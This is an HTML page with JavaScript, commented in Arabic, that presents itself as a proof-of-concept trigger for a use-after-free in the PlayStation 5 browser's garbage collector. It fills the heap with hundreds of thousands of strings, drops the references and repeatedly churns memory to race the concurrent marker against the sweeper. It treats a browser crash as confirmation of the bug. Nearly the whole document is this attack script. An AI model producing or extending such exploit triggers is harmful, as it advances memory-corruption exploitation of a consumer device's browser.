<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>PS5 Heap UAF — Concurrent Marking Race</title>
</head>
<body>
<pre id="log" style="white-space:pre-wrap; word-break:break-all; background:#111; color:#0F0; padding:10px;"></pre>
<script>
const L = s => { document.getElementById('log').textContent += s + '\n'; };

L('[*] Starting Heap Concurrent Marking UAF test...');

// الخطوة 1: إنشاء نصوص كثيرة جداً
L('[*] Phase 1: Allocating 500,000 strings...');
let strings = [];
for (let i = 0; i < 500000; i++) {
    // نصوص قصيرة لملء الـ IsoHeap بسرعة
    strings.push("str_" + i + "_AAAAAAAAAAAAAAAAAAAA");
}
L('[+] Strings allocated.');

// الخطوة 2: إجبار جامع القمامة على العمل المتزامن
// إسقاط المراجع القوية سيجعل النصوص مؤهلة للحذف
L('[*] Phase 2: Dropping references to trigger GC...');
strings = null;

// الخطوة 3: محاولة إطلاق Race Condition
// نقوم بإنشاء نصوص جديدة بسرعة لدفع المؤقت (Sweeper) للعمل
// بينما خيط الجامع لا يزال يمسح النصوص القديمة
L('[*] Phase 3: Racing Sweeper timer with Concurrent Marker...');

function raceGC() {
    let tmp = [];
    for (let i = 0; i < 100000; i++) {
        // إنشاء وتدمير سريع لتوليد ضغط على الذاكرة
        tmp.push("race_" + i + "_BBBBBBBBBBBBBBBBBBBB");
    }
    tmp = null;
}

// تشغيل السباق عدة مرات لزيادة فرصة الـ UAF
for (let i = 0; i < 10; i++) {
    L('  [Race attempt ' + (i+1) + '/10]');
    raceGC();
    // تأخير بسيط للسماح لخيط الجامع بالبدء
    // (متصفح PS5 لا يوفر performance.now دقيق، لذا نستخدم حلقة مشغولة)
    let waste = 0;
    for (let j = 0; j < 1000000; j++) { waste += j; }
}

L('[+] Race finished.');
L('[*] If the browser crashed, the UAF in the GC collector thread is confirmed.');
L('[*] If it survived, the timing window might be too tight or GC is configured differently.');
</script>
</body>
</html>
